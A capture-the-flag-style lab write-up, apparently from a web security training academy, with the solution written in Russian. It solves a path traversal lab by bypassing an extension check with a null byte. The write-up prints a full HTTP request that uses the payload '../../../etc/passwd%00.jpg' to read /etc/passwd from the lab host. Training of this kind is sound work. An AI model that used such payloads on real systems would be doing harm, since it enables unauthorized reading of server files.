# File path traversal, validation of file extension with null byte bypass
PRACTITIONER

This lab contains a path traversal vulnerability in the display of product images.

The application validates that the supplied filename ends with the expected file extension.

To solve the lab, retrieve the contents of the /etc/passwd file.

## Решение
В условии сказано, что приложение проверяет расширение запрашиваемого файла.

В статье ["Advanced Directory Traversal filter bypassing"](https://code.google.com/archive/p/teenage-mutant-ninja-turtles/wikis/AdvancedObfuscationPathtraversal.wiki) найден способ обхода фильтрации через использование т.н. "null byte". Комбинация %00 декодируется в null, который интерпретируется как окончание строки. После прохода через фильтр всё после %00 отбрасывается и происодит чтение запрашиваемого файла:

```
GET /image?filename=../../../etc/passwd%00.jpg HTTP/2
Host: 0a9100f60491d06b803a993a00fa0076.web-security-academy.net
Cookie: session=yQCSyXbLo68iZ7SwCLa10DuR4GOjQeU2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9100f60491d06b803a993a00fa0076.web-security-academy.net/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Te: trailers
```
Задание выполнено.